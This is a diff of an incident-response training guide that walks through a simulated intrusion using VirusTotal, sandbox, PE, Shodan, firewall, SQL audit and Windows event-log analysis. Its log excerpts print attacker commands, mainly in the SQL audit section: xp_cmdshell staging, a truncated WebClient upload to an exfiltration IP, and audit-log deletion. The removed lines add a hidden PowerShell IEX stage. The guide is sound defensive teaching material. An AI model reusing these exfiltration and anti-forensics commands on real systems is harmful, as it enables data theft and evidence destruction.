-```json
-{
-  "created":    "2024-10-12T00:00:00Z",
-  "registrar":  "Namecheap",
-  "resolves_to":["203.0.113.87"],
-  "malicious":  8,
-  "categories": {"Forcepoint ThreatSeeker": "malware sites"}
-}
-```
-
-Domain registered 2024-10-12 — 10 days before the first phishing email. This is staged infrastructure, not a compromised legitimate site.
-
-**Enrich the binary hash:**
-
-```bash
-curl -s "https://www.virustotal.com/api/v3/files/3b4c14a87e5f9d8c2a1f4e6b9c0d2e7a1b3c5d8f2a4e6c8b0d3e5a7c1f4b8d2e" \
-  -H "x-apikey: $VT_API_KEY" | jq '{
-    name:        .data.attributes.meaningful_name,
-    type:        .data.attributes.type_description,
-    malicious:   .data.attributes.last_analysis_stats.malicious,
-    pe_ts:       .data.attributes.pe_info.timestamp,
-    imphash:     .data.attributes.pe_info.imphash,
-    first_seen:  (.data.attributes.first_submission_date | todate),
-    tags:        .data.attributes.tags
-  }'
-```
-
-Output:
-```json
-{
-  "name":       "svchost32.exe",
-  "type":       "Win32 EXE",
-  "malicious":  31,
-  "pe_ts":      "2018-04-09T08:00:00Z",
-  "imphash":    "3a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d",
-  "first_seen": "2024-11-15T00:00:00Z",
-  "tags":       ["peexe", "overlay", "timestomped"]
-}
-```
-
-Three findings:
-1. `"malicious": 31` — heavily flagged
-2. `"tags": ["timestomped"]` — VirusTotal's own analysis confirms the PE timestamp is forged
-3. `"first_seen": "2024-11-15"` — fresh binary, first submitted today; not in prior campaigns under this hash
-
-**In the VirusTotal web UI** (navigate to `virustotal.com`, search the hash):
-- **Relations tab** → contacted IPs and domains — confirms `203.0.113.87` and `198.51.100.44` as network IOCs
-- **Behavior tab** → sandbox results: process tree, registry writes, scheduled task creation
-- **Graph button** → visualize the full IOC cluster: binary → C2 IPs → C2 domains → related files
-- **Community tab** → analyst comments — check if anyone has attributed this tool to a named cluster
-
-**Search the imphash for related samples:**
-
-In the VT search bar, type:
-```
-imphash:3a2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d
-```
-
-If other samples share the same imphash, they were compiled from the same codebase. This is a toolchain pivot — it may link this binary to a named cluster or previous campaigns.
 
 ---
 
 ### 7. Sandbox Analysis — Submit the Binary
 
-Static detection scores tell you what vendors think. Sandbox analysis tells you what the binary *does* — its process tree, network calls, persistence, and dropped files. Use a sandbox for every unknown binary, even when VT scores are high.
+Submit `svchost32.exe` (recovered via CrowdStrike RTR) to a sandbox. ANY.RUN is the recommended choice for training — it is interactive and lets you watch execution in real time.
 
-**Tools available:**
+**Submission (ANY.RUN):**
 
-| Service | URL | Cost | Best For |
-|---|---|---|---|
-| ANY.RUN | [app.any.run](https://app.any.run) | Free (community) | Interactive — watch execution in real time, click around |
-| Hybrid Analysis | [hybrid-analysis.com](https://hybrid-analysis.com) | Free | CrowdStrike-powered, good MITRE mapping |
-| Joe Sandbox | [joesandbox.com](https://joesandbox.com) | Free (basic) | Deepest report, best for evasive samples |
-| VirusTotal Sandbox | virustotal.com → Behavior tab | Free | Fastest if binary is already on VT |
-
-**Submission procedure (ANY.RUN):**
-
-1. Open [app.any.run](https://app.any.run) → **New Task**
-2. Click **Upload** → select `svchost32.exe` (recovered from WS-CFO-01)
-3. Environment: **Windows 10 x64**, **User mode** (not admin — realistic CFO execution context)
-4. Network mode: **Fake** for training; **Real** with IDS for a live investigation
-5. Timeout: **120 seconds** — this beacon interval is ~7 minutes so increase to **600 seconds** to catch second beacon
+1. Navigate to [app.any.run](https://app.any.run) → **New Task** → **Upload**
+2. Upload `svchost32.exe`
+3. Environment: **Windows 10 x64**, **User mode** (realistic CFO context)
+4. Network mode: **Fake** for training / **Real with IDS** for live investigations
+5. Timeout: **600 seconds** — the ~7-minute beacon interval requires this
 6. Click **Run**
 
-**What to look for when the task completes:**
+**Download the report to VS Code:**
 
-**Process tree** — expand every branch:
+After execution completes, click **Export** → **JSON** in ANY.RUN. Save it as:
+
 ```
-svchost32.exe (PID 1234)                              [initial execution]
-├── cmd.exe /c powershell.exe -NoP -W Hidden "IEX …"  [second-stage in-memory exec]
-│   └── powershell.exe (PID 1612)                      [stage 2 running]
-├── schtasks.exe /Create /tn "ScheduledUpdateCheck"… [persistence]
-└── svchost32.exe → copy to AppData\Roaming\…         [self-copy for persistence]
+03-analysis/sandbox-svchost32-anyrun.json
 ```
 
-**Network connections tab:**
-```
-203.0.113.87:443   GET /update   T+7s    [first beacon]
-203.0.113.87:443   GET /update   T+432s  [second beacon — confirms ~7 min interval]
-198.51.100.44:443  POST /recv    T+441s  [secondary C2 contacted]
-```
+**Open in VS Code:** press `Shift+Alt+F` to format. Use `Ctrl+Shift+O` (Outline) to navigate, `Ctrl+F` to search:
 
-The secondary C2 `198.51.100.44` being contacted confirms it is part of the binary's built-in C2 rotation, not only the exfil endpoint.
+| Search term | What you find |
+|---|---|
+| `connections` | Network connections: `203.0.113.87:443` and `198.51.100.44:443` |
+| `registry` | Run key written to `HKCU\...\Run\WindowsHostSvc` |
+| `files` | `UpdateHelper.tmp` created and renamed to `.dll` |
+| `interval` | ~7-minute beacon interval confirmed |
 
-**Registry tab:**
-```
-HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsHostSvc
-  → C:\Users\[user]\AppData\Roaming\Microsoft\Windows\svchost32.exe -k netsvcs
-```
-
-**File activity tab:**
-```
-Created:  C:\Users\[user]\AppData\Local\Temp\UpdateHelper.tmp    [second stage dropped]
-Renamed:  UpdateHelper.tmp → UpdateHelper.dll
-```
-
-Download the sandbox's **IOC report** (JSON/CSV button at top right) — it gives you additional hashes for `UpdateHelper.dll`, exact C2 URLs with paths, and the User-Agent string (`Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1)`) that becomes a SIEM hunting target.
-
-**Add the UpdateHelper.dll hash to your IOC list.** Pivot it on VirusTotal and check Shodan for infrastructure it contacts if the sandbox resolves DNS.
+Get the hash of `UpdateHelper.dll` from the report, add it to `ioc-queries.http`, and click **Send Request** to pivot on VT immediately.
 
 ---
 
-### 8. Static Binary Analysis
+### 8. Static Binary Analysis — Hex Editor + Terminal
 
-For air-gapped environments or when you cannot submit to a cloud sandbox:
+**Open the binary in VS Code Hex Editor:**
+
+In VS Code Explorer, right-click `svchost32.exe` → **Open With** → **Hex Editor**
+
+The file opens as a hex+ASCII dual-pane view. The ASCII column on the right makes string hunting visual — scroll through it and C2 strings like `203.0.113.87` are readable directly without running `strings`.
+
+**Navigate to the PE timestamp:**
+
+Press `Ctrl+G` → type `3C` → Enter. This is the `e_lfanew` field (PE header pointer). Read the 4-byte little-endian value there, convert to decimal — that is the offset to the PE signature (`PE\0\0`). Go to that offset + `8` for the `TimeDateStamp` field.
+
+For precise extraction, split the screen: keep Hex Editor on the left, open the integrated terminal on the right:
 
 ```bash
-pip install pefile
-```
-
-**Extract and validate the PE compile timestamp:**
-
-```python
-import pefile
-import datetime
-import os
-
+python3 -c "
+import pefile, datetime, os
 pe = pefile.PE('svchost32.exe')
 ts = pe.FILE_HEADER.TimeDateStamp
-print(f"Claimed compile timestamp: {datetime.datetime.utcfromtimestamp(ts)}")
-print(f"File size on disk:         {os.path.getsize('svchost32.exe'):,} bytes")
-print(f"PE SizeOfImage:            {pe.OPTIONAL_HEADER.SizeOfImage:,} bytes")
-
+print(f'Compile timestamp : {datetime.datetime.utcfromtimestamp(ts)} UTC')
+print(f'File size on disk : {os.path.getsize(\"svchost32.exe\"):,} bytes')
+print(f'PE SizeOfImage    : {pe.OPTIONAL_HEADER.SizeOfImage:,} bytes')
 overlay = os.path.getsize('svchost32.exe') - pe.OPTIONAL_HEADER.SizeOfImage
 if overlay > 0:
-    print(f"Overlay detected:          {overlay:,} bytes after PE end (possible embedded payload)")
+    print(f'Overlay detected  : {overlay:,} bytes after PE end')
+print(f'imphash           : {pe.get_imphash()}')
+"
 ```
-
-Output:
-```
-Claimed compile timestamp: 2018-04-09 08:00:00
-File size on disk:         487,424 bytes
-PE SizeOfImage:            462,848 bytes
-Overlay detected:          24,576 bytes after PE end (possible embedded payload)
-```
-
-To verify whether the 2018 timestamp is plausible, check the imported APIs:
-
-```python
-# Post-2018 Windows APIs that would not exist in an April 2018 build
-post_2018_apis = {
-    'SetProcessDpiAwarenessContext': 'Windows 10 1703 (2017)',
-    'GetSystemCpuSetInformation':    'Windows 10 1607 (2016)',
-    'CreatePseudoConsole':           'Windows 10 1809 (2018-Oct)',
-}
-
-for entry in pe.DIRECTORY_ENTRY_IMPORT:
-    for imp in entry.imports:
-        if imp.name and imp.name.decode() in post_2018_apis:
-            api = imp.name.decode()
-            print(f"Post-2018 API: {entry.dll.decode()}::{api}  [{post_2018_apis[api]}]")
-```
-
-Output:
-```
-Post-2018 API: USER32.dll::SetProcessDpiAwarenessContext  [Windows 10 1703 (2017)]
-```
-
-A binary compiled in April 2018 could theoretically use this API (SDK existed). But combined with VirusTotal's `timestomped` tag and the implausibility of fresh command-and-control infrastructure from 2018 still being operational — **assessment: timestamp is forged (T1070.006 — Timestomping).**
-
-**Extract strings for C2 IOCs:**
 
 ```bash
-strings svchost32.exe | grep -E "(https?://|\.biz|\.net|cdn|update|recv|sys-|Mozilla)"
-```
-
-Output:
-```
-https://203.0.113.87/update
-https://198.51.100.44/recv
-telemetry-cdn-services.biz
-sys-update-cdn.net
-Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 6.1)
-/update
-/recv
-```
-
-Both C2 IPs and both domains are hardcoded. `sys-update-cdn.net` will appear again in the Palo Alto DNS log during the formula exfiltration, linking this binary's infrastructure to the R&D server operation.
-
-```bash
-# Extract the imphash for toolchain pivoting
-python3 -c "import pefile; pe=pefile.PE('svchost32.exe'); print('imphash:', pe.get_imphash())"
-```
-
-Search this imphash on VirusTotal (search bar: `imphash:VALUE`) to find related samples compiled from the same source. If hits exist, read their submission metadata — they may predate this investigation and link to named actor clusters.
-
----
-
-### 9. Infrastructure Pivot — Shodan, crt.sh, PassiveDNS
-
-The goal: find more of the actor's infrastructure before they burn it, and link it to known clusters for attribution.
-
-**Shodan — open ports and co-hosted services:**
-
-```bash
-export SHODAN_KEY="your_shodan_key_here"
-
-# Primary C2 IP
-curl -s "https://api.shodan.io/shodan/host/203.0.113.87?key=$SHODAN_KEY" | \
-  jq '{
-    hostnames, ports, org, country_name,
-    services: [.data[] | {port, transport, product, version}]
-  }'
-```
-
-Output:
-```json
-{
-  "hostnames":  ["telemetry-cdn-services.biz"],
-  "ports":      [22, 443, 8443],
-  "org":        "Hostwinds LLC",
-  "services": [
-    {"port": 443,  "product": "nginx", "version": "1.24.0"},
-    {"port": 8443, "product": "nginx", "version": "1.24.0"},
-    {"port": 22,   "product": "OpenSSH", "version": "8.9p1"}
-  ]
-}
-```
-
-Port 8443 alongside 443 — likely a second C2 channel or management interface. Both running nginx 1.24.0 — check CVE feeds if this version has exploitable vulnerabilities (it doesn't here, but the habit matters).
-
-```bash
-# Secondary C2 / exfil IP
-curl -s "https://api.shodan.io/shodan/host/198.51.100.44?key=$SHODAN_KEY" | \
-  jq '{hostnames, ports, org, country_name}'
-```
-
-Output:
-```json
-{
-  "hostnames":  ["sys-update-cdn.net", "198.51.100.44.host.secureserver.net"],
-  "ports":      [22, 443, 8443],
-  "org":        "GoDaddy.com, LLC",
-  "country_name": "United States"
-}
-```
-
-`sys-update-cdn.net` confirmed co-hosted on the exfil IP. Both C2 IPs share the same port layout (22/443/8443) — consistent with cloned infrastructure deployment.
-
-**Certificate Transparency — discover undiscovered domains:**
-
-```bash
-# Find all TLS certs issued for the primary C2 IP
-curl -s "https://crt.sh/?q=203.0.113.87&output=json" | \
-  jq '[.[] | .name_value] | unique | .[]'
-```
-
-Output:
-```
-"telemetry-cdn-services.biz"
-"cdn-telemetry-update.biz"
-"windows-cdn-service.net"
-"*.telemetry-cdn-services.biz"
-```
-
-`cdn-telemetry-update.biz` and `windows-cdn-service.net` — **two new domains you haven't seen in the org's logs.** Immediately search them in the NGFW DNS log:
-
-```bash
-grep -E "cdn-telemetry-update|windows-cdn-service" palo-alto/dns-queries.csv
-```
-
-If any internal hosts queried these domains, the scope has expanded. Add them to the IOC list regardless — they are part of the same C2 cluster.
-
-```bash
-# When was the cert issued? Certificate timing vs domain registration
-curl -s "https://crt.sh/?q=telemetry-cdn-services.biz&output=json" | \
-  jq '[.[] | {name: .name_value, issued: .not_before, issuer: .issuer_cn}] | 
-      unique_by(.name) | sort_by(.issued)'
-```
-
-Cert issued date will be within 24 hours of domain registration — confirming automated, scripted infrastructure deployment.
-
-**Passive DNS — historical resolutions:**
-
-```bash
-export PDNS_KEY="your_pdns_key_here"
-
-curl -s "https://api.passivedns.com/v2/search?q=203.0.113.87" \
-  -H "Authorization: Token $PDNS_KEY" | \
-  jq '.results[] | {domain: .rrname, first_seen: .time_first, last_seen: .time_last, count}' \
-  | head -20
-```
-
-If the IP was used in prior campaigns, you will see older domains. Cross-reference them against ClearSky and Mandiant public reporting on Iranian-nexus industrial espionage clusters. Even partial matches at Medium-High confidence are usable for attribution.
-
-**WHOIS — registration timing:**
-
-```bash
-# Check registration date relative to first phishing email
-whois mfa-lifetechpharma.com | grep -E "(Registrar:|Creation Date:|Registrant)"
-```
-
-Or via RDAP (returns structured JSON):
-```bash
-curl -s "https://rdap.org/domain/mfa-lifetechpharma.com" | \
-  jq '{
-    registered: (.events[] | select(.eventAction=="registration") | .eventDate),
-    expires:    (.events[] | select(.eventAction=="expiration")   | .eventDate),
-    registrar:  .entities[0].vcardArray[1][1]
-  }'
-```
-
-Expected result: registration date 2024-10-18, expiry 2025-10-18 (1-year registration). Phishing email was sent 4 days after registration — targeted, purpose-built infrastructure, not a pre-existing domain.
-
----
-
-### 10. NGFW Log Analysis
-
-**Files:**
-- `palo-alto/ngfw-flows.csv` — firewall session flows (layer 4 + app-id)
-- `palo-alto/dns-queries.csv` — DNS telemetry (full resolution log)
-
-**Confirm the exfiltration flow:**
-
-```bash
-# Find the 381 MB outbound flow
-grep "198.51.100.44" palo-alto/ngfw-flows.csv | column -t -s','
-```
-
-```python
-import csv
-
-with open('palo-alto/ngfw-flows.csv') as f:
-    lines = [l for l in f if not l.startswith('#')]
-    reader = csv.DictReader(lines)
-    for row in reader:
-        dst = row.get('dst_ip', row.get('dst', ''))
-        if '198.51.100.44' in dst:
-            bytes_out = int(row.get('bytes_sent', row.get('bytes', 0)))
-            print(f"  Time:     {row['receive_time']}")
-            print(f"  Source:   {row.get('src_ip', row.get('src', '?'))} ({row.get('src_zone','?')})")
-            print(f"  Dest:     {dst}:{row.get('dst_port','?')}")
-            print(f"  Bytes:    {bytes_out/1024/1024:.1f} MB outbound")
-            print(f"  Duration: {row.get('elapsed_time','?')}s")
-            print(f"  App-ID:   {row.get('app','?')}")
-            print(f"  Action:   {row.get('action','?')}")
-```
-
-Output:
-```
-  Time:     2024-11-06T00:14:14Z
-  Source:   10.10.2.15 (trust-dmz)  ←  SERVER-RD-02
-  Dest:     198.51.100.44:443
-  Bytes:    381.0 MB outbound
-  Duration: 305s
-  App-ID:   ssl
-  Action:   allow
-```
-
-381 MB from `SERVER-RD-02` to the exfil IP in 305 seconds (~1.2 MB/s — consistent with a business-grade internet uplink). Timestamp `00:14:14Z` matches the SQL audit log `WebClient.UploadFile` at `00:13:54Z` — 20 seconds after the PowerShell command was issued. This is the exfiltration confirmation.
-
-**C2 beacon pattern — measure the interval:**
-
-```bash
-# Extract timestamps of beacons to the primary C2 and compute inter-beacon intervals
-grep "telemetry-cdn-services.biz" palo-alto/dns-queries.csv \
-  | grep -v "^#" \
-  | awk -F',' '{print $1}' \
-  | python3 -c "
-import sys, datetime
-times = []
-for line in sys.stdin:
-    try:
-        times.append(datetime.datetime.fromisoformat(line.strip()))
-    except: pass
-times.sort()
-for i, t in enumerate(times):
-    if i == 0:
-        print(f'{t}  [first beacon]')
-    else:
-        delta = int((t - times[i-1]).total_seconds())
-        print(f'{t}  +{delta}s ({delta//60}m{delta%60}s)')
+# Verify the 2018 timestamp is forged — check for post-2018 Windows APIs
+python3 -c "
+import pefile
+post_2018 = {'SetProcessDpiAwarenessContext', 'GetSystemCpuSetInformation', 'CreatePseudoConsole'}
+pe = pefile.PE('svchost32.exe')
+for e in pe.DIRECTORY_ENTRY_IMPORT:
+    for i in e.imports:
+        if i.name and i.name.decode() in post_2018:
+            print(f'Post-2018 API: {e.dll.decode()}::{i.name.decode()}')
 "
 ```
 
 Output:
 ```
-2024-11-01T07:14:00Z  [first beacon — same second GAP-001 ends]
-2024-11-01T07:14:02Z  +2s (0m2s)     ← rapid re-query on startup
-2024-11-01T07:21:14Z  +432s (7m12s)  ← beacon interval begins
-2024-11-01T07:28:44Z  +450s (7m30s)  ← ~7 min
-2024-11-06T00:09:01Z  +?             ← later session, pre-exfil
-2024-11-15T16:42:33Z  +?             ← CFO host, same C2 domain
+Post-2018 API: USER32.dll::SetProcessDpiAwarenessContext
 ```
 
-The ~7-minute interval matches sandbox analysis. This regularity is itself an indicator: a Sigma rule alerting on DNS queries to the same external domain every 6–8 minutes from any internal host would catch this without knowing the specific IOC.
-
-**Explore both NGFW files interactively with VisiData:**
+**Extract C2 strings:**
 
 ```bash
-# Open both files as separate sheets in one session
-vd palo-alto/ngfw-flows.csv palo-alto/dns-queries.csv
+strings svchost32.exe | grep -E "(https?://|\.biz|\.net|cdn|recv|update|sys-|Mozilla)"
 ```
 
-VisiData opens on the first file. Press `S` (Sheets list) to see both loaded sheets and switch between them with `Enter`.
+`sys-update-cdn.net` in the string output links this binary to the R&D server exfiltration path — the same domain that appeared in `dns-queries.csv` during the formula theft.
+
+**Paste the imphash into the `ioc-queries.http` file** (already open in VS Code) and click **Send Request** on the imphash pivot block to find related samples immediately.
 
 ---
 
-**ngfw-flows.csv — find the largest outbound transfer in 3 keystrokes:**
+### 9. Infrastructure Pivot — REST Client + Global Search
 
-```bash
-vd palo-alto/ngfw-flows.csv
-```
+The `ioc-queries.http` file already contains the Shodan, crt.sh, and RDAP blocks. Click through them.
 
-1. Navigate to the `bytes_sent` column
-2. Press `#` — set type to integer (required for numeric sort)
-3. Press `]` — sort descending
+**For the crt.sh response:** press `Ctrl+F` in the response pane, search `name_value`. Two new domains appear: `cdn-telemetry-update.biz` and `windows-cdn-service.net`.
 
-The 381 MB exfil row (`bytes_sent = 399481224`) floats to the top immediately. No grep, no Python.
+**Immediately pivot in VS Code global search:**
 
-**Frequency table on destination IPs — see all external connections ranked:**
-
-1. Navigate to the `dst_ip` column (or `dst` depending on header)
-2. Press `F`
+Press `Ctrl+Shift+F`, type `cdn-telemetry-update`:
 
 ```
-dst_ip           count
-203.0.113.87        9
-198.51.100.44       1
-10.10.4.1          47    ← internal DNS resolver, expected
-...
+palo-alto/dns-queries.csv  →  (no results)
 ```
 
-Two external IPs with non-trivial hit counts stand out immediately against the internal baseline.
+Not in the org's DNS logs — but add both new domains to the IOC list in case they appear in a broader hunt.
 
-**Filter for only external traffic (non-RFC-1918):**
-
-1. Navigate to the `dst_ip` column
-2. Press `|`, type `^(?!10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)`, press `Enter`
-3. Press `"` — new sheet with only external destination rows
-
-**Compute bytes in MB on the fly:**
-
-1. Press `=` (add derived column), type `int(bytes_sent)/1024/1024`, press `Enter`
-2. A new `bytes_MB` column appears — set it to float with `%`, then sort with `]`
+**For the RDAP response** (AiTM domain): `Ctrl+F` → `registration` → date `2024-10-18`. The phishing email was sent 4 days later. Targeted, purpose-built infrastructure.
 
 ---
 
-**dns-queries.csv — beacon pattern analysis:**
+### 10. NGFW Log Analysis — Rainbow CSV
 
-```bash
-vd palo-alto/dns-queries.csv
+**In VS Code Explorer:** click `palo-alto/ngfw-flows.csv`
+
+Rainbow CSV colorizes columns. The status bar shows column names as you move the cursor.
+
+**RBQL — find the exfiltration row:**
+
+Press `F5`:
+
+```sql
+SELECT a.receive_time, a.src, a.dst_ip, a.dst_port,
+       CAST(a.bytes_sent AS int) / 1048576 AS bytes_MB,
+       a.elapsed_time, a.app, a.action
+FROM a
+WHERE a.dst_ip == '198.51.100.44'
 ```
 
-**Frequency table on query domain — instantly see which domain was queried most:**
-
-1. Navigate to the `query` column
-2. Press `F`
-
+Result pane:
 ```
-query                         count
-telemetry-cdn-services.biz       9
-globalcontracts-secure.net       1
-vpn.lifetechpharma.com           1
-mfa-lifetechpharma.com           2
-...
+2024-11-06T00:14:14Z | 10.10.2.15 | 198.51.100.44 | 443 | 381.0 | 305 | ssl | allow
 ```
 
-`telemetry-cdn-services.biz` with 9 queries immediately stands out — that's the C2 beacon pattern. Any legitimate CDN would appear hundreds of times; 9 queries in 3 weeks from a single internal host is not CDN traffic.
+381 MB confirmed in one query line. No Python, no grep.
 
-**Filter to the C2 domain and measure time gaps between beacons:**
+**Largest transfers overall — top 5:**
 
-1. Navigate to the `query` column
-2. Press `|`, type `telemetry-cdn`, press `Enter`
-3. Press `"` — filtered sheet with only C2 beacon rows
-4. Navigate to `receive_time` column, press `@` (set type to date), press `[` to sort ascending
-5. Read the `receive_time` values top to bottom — the ~7-minute interval is visible by eye
+```sql
+SELECT a.receive_time, a.src, a.dst_ip,
+       CAST(a.bytes_sent AS int) / 1048576 AS bytes_MB
+FROM a
+ORDER BY CAST(a.bytes_sent AS int) DESC LIMIT 5
+```
 
-**Cross-reference category labels:**
+**External destination frequency — find all non-RFC-1918 destinations:**
 
-1. Navigate to the `category` column
-2. Press `F` — frequency table shows `malware` category on C2-linked queries vs `business-and-economy` on legitimate traffic
-3. Press `Enter` on the `malware` row — jumps to all rows matching that category
+```sql
+SELECT a.dst_ip, COUNT(a.dst_ip) AS connections
+FROM a
+WHERE NOT (a.dst_ip LIKE '10.%' OR a.dst_ip LIKE '192.168.%')
+GROUP BY a.dst_ip
+ORDER BY COUNT(a.dst_ip) DESC
+```
+
+---
+
+**Click `palo-alto/dns-queries.csv`** in Explorer:
+
+**C2 domain frequency — beacon pattern visible immediately:**
+
+```sql
+SELECT a.query, COUNT(a.query) AS queries, a.category
+FROM a
+GROUP BY a.query, a.category
+ORDER BY COUNT(a.query) DESC
+```
+
+Result:
+```
+telemetry-cdn-services.biz | 9 | malware
+```
+
+9 queries of the same external domain from internal hosts — not CDN traffic. The `malware` category label from Palo Alto confirms it.
+
+**Beacon timing — filter to C2 domain and sort by time:**
+
+```sql
+SELECT a.receive_time, a.src, a.query, a.response
+FROM a
+WHERE a.query == 'telemetry-cdn-services.biz'
+ORDER BY a.receive_time
+```
+
+The ~7-minute intervals are visible in the sorted result. No Python datetime script needed.
+
+**Cross-reference with flows — does the DNS match a flow?**
+
+Press `Ctrl+Shift+F` in VS Code: search `telemetry-cdn-services.biz`:
+
+```
+dns-queries.csv    lines 13-22: 9 DNS queries, first at 2024-11-01T07:14:00Z
+ngfw-flows.csv     lines 8-16:  corresponding HTTPS flows to 203.0.113.87
+```
 
 ---
 
 ### 11. SQL Audit Log Analysis
 
-**File:** `sql-audit/SERVER-RD-02-sql-audit.jsonl`
+**In VS Code Explorer:** click `sql-audit/SERVER-RD-02-sql-audit.jsonl`
 
-This is the Splunk-forwarded copy — the adversary deleted the server-side database entries, but Splunk had already ingested them.
+Each line is a JSON object. Use `Ctrl+F` to navigate directly to key events:
+
+| Search term | Jumps to |
+|---|---|
+| `xp_cmdshell` | Shell execution events |
+| `AuditLog` | Adversary OPSEC recon (`SELECT`) and anti-forensics (`DELETE`) |
+| `UploadFile` | The exfiltration command |
+| `Compress-Archive` | The staging command |
+
+**Full chain in the terminal:**
 
 ```bash
-# Print the full adversary action chain in time order
 jq -r '[.EventTime, .LoginName, .StatementType, (.Statement[0:90])] | @tsv' \
   sql-audit/SERVER-RD-02-sql-audit.jsonl
 ```
 
-Output:
-```
-2024-11-06T00:10:14Z  LIFETECHPHARMA\svc_backup  BATCH_COMPLETED  xp_cmdshell 'dir "D:\LicenseDeals\USPartner2024\" /b /s'
-2024-11-06T00:10:18Z  LIFETECHPHARMA\svc_backup  SELECT           SELECT TOP 1 * FROM dbo.AuditLog WHERE ObjectPath LIKE '%USPartner2024%'...
-2024-11-06T00:10:44Z  LIFETECHPHARMA\svc_backup  BATCH_COMPLETED  EXEC xp_cmdshell 'powershell.exe -Command "Compress-Archive -Path D:\LicenseD...
-2024-11-06T00:13:54Z  LIFETECHPHARMA\svc_backup  BATCH_COMPLETED  EXEC xp_cmdshell 'powershell.exe -Command "$c=New-Object System.Net.WebClient...
-2024-11-06T00:14:58Z  LIFETECHPHARMA\svc_backup  BATCH_COMPLETED  EXEC xp_cmdshell 'del /F /Q "C:\Windows\Temp\update_pkg.zip"'
-2024-11-06T00:15:22Z  LIFETECHPHARMA\svc_backup  DELETE           DELETE FROM dbo.AuditLog WHERE EventTime >= '2024-11-06T00:00:00'...
-```
-
-The full chain:
-
-| Step | Time | Statement | ATT&CK |
-|---|---|---|---|
-| 1. Enumerate | 00:10:14 | `xp_cmdshell dir USPartner2024/` | T1083 |
-| 2. OPSEC recon | 00:10:18 | `SELECT FROM AuditLog` — checking for prior access records | T1018 |
-| 3. Stage | 00:10:44 | `Compress-Archive ... update_pkg.zip` | T1560 |
-| 4. Exfil | 00:13:54 | `WebClient.UploadFile → 198.51.100.44` | T1041 |
-| 5. Cleanup | 00:14:58 | `del update_pkg.zip` | T1070.004 |
-| 6. Anti-forensics | 00:15:22 | `DELETE FROM AuditLog` (8 rows removed) | T1070 |
-
-**Step 2 is the most operationally significant.** The adversary queried the existing audit log *before stealing the data* — checking whether any prior access was already recorded. This indicates operational maturity: they were worried about leaving a trail that would reveal this was not their first visit.
-
-**Step 6 failed** because Splunk had already forwarded these rows before the `DELETE` ran. This is the operational value of an out-of-band log pipeline the adversary cannot reach via their database credentials.
+Six events: enumerate → recon (SELECT AuditLog) → stage → exfil → cleanup → anti-forensics (DELETE AuditLog). The `DELETE` at `00:15:22Z` failed because Splunk had already ingested these rows before it ran.
 
 ---
 
 ### 12. Windows Security Event Log Analysis
 
-**Files:**
-- `windows-security/DC01-security.jsonl` — Domain Controller
-- `windows-security/SERVER-RD-02-security.jsonl` — R&D file server
+**In VS Code Explorer:** click `windows-security/DC01-security.jsonl`
 
-**Confirm DCSync on DC01 — this is the most critical event in the entire investigation:**
+Press `Ctrl+F`, search `4662` — jumps to the DCSync event. The `analyst_note` gives the human-readable summary in the file itself:
+
+```
+🔴 CRITICAL: DCSync — DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
+from WORKSTATION IP 10.10.3.22 (WS-IT-LEVI). NOT a DC. NOT in pentest VLAN (10.10.99.x).
+```
 
 ```bash
-# Find EID 4662 — the DCSync indicator
+# All three DCSync events — domain, krbtgt, Administrator
 jq 'select(.EventID == 4662) | {
-  time:        .TimeCreated,
-  subject:     .SubjectUserName,
-  domain:      .SubjectDomainName,
-  object_type: .ObjectType,
-  object_name: .ObjectName,
-  properties:  (.Properties // "" | .[0:120]),
-  note:        .analyst_note
+  time: .TimeCreated, subject: .SubjectUserName, object: .ObjectName
 }' windows-security/DC01-security.jsonl
-```
-
-Output (first event):
-```json
-{
-  "time":        "2024-11-06T00:48:33Z",
-  "subject":     "svc_backup",
-  "domain":      "LIFETECHPHARMA",
-  "object_type": "{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
-  "object_name": "DC=lifetechpharma,DC=local",
-  "properties":  "{19195a5b-...}\n{1131f6aa-...}\n{1131f6ab-...}\n{89e95b76-...}",
-  "note":        "🔴 CRITICAL: DCSync — DS-Replication-Get-Changes + DS-Replication-Get-Changes-All from WORKSTATION IP 10.10.3.22 (WS-IT-LEVI)..."
-}
-```
-
-The GUID `19195a5b` is the `domainDNS` object class. Properties `1131f6aa` and `1131f6ab` are the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` extended rights. This is the textbook DCSync signature.
-
-Note: Windows EID 4662 does not log the source IP directly — the `analyst_note` records it from the correlated EID 4624 `SubjectLogonId` matching. The source was confirmed as `10.10.3.22` (WS-IT-LEVI) via that correlation.
-
-```bash
-# Which accounts were DCSync'd? Check for krbtgt and Administrator
-jq 'select(.EventID == 4662) | {
-  time:    .TimeCreated,
-  subject: .SubjectUserName,
-  object:  .ObjectName
-}' windows-security/DC01-security.jsonl
-```
-
-If `krbtgt` and `Administrator` appear — the adversary now holds Kerberos golden ticket and administrator hash capability. The scope of remediation is not three hosts: it is full domain credential rotation.
-
-**Confirm file access on R&D server:**
-
-```bash
-# Count EID 4663 file access events in USPartner2024
-jq 'select(.EventID == 4663) | {
-  time:    .TimeCreated,
-  subject: .SubjectUserName,
-  file:    .ObjectName,
-  access:  .AccessMask
-}' windows-security/SERVER-RD-02-security.jsonl | jq -s 'length'
-```
-
-```bash
-# Show the first and last accessed file + timestamps
-jq 'select(.EventID == 4663) | {time: .TimeCreated, file: (.ObjectName | split("\\\\") | last)}' \
-  windows-security/SERVER-RD-02-security.jsonl | jq -s 'sort_by(.time) | [first, last]'
-```
-
-47 individual file access events, each formula file accessed sequentially between `00:10` and `00:14` UTC — the `Compress-Archive` command reads each source file individually before writing the zip. The 4-minute window exactly matches the SQL audit timestamps.
-
-**Confirm the outbound network connection from the file server:**
-
-```bash
-jq 'select(.EventID == 5156) | {
-  time:      .TimeCreated,
-  process:   (.Application | split("\\\\") | last),
-  src:       .SourceAddress,
-  dst:       .DestAddress,
-  dst_port:  .DestPort,
-  direction: .Direction
-}' windows-security/SERVER-RD-02-security.jsonl
 ```
 
 Output:
 ```json
-{
-  "time":      "2024-11-06T00:14:14Z",
-  "process":   "powershell.exe",
-  "src":       "10.10.2.15",
-  "dst":       "198.51.100.44",
-  "dst_port":  443,
-  "direction": "Outbound"
-}
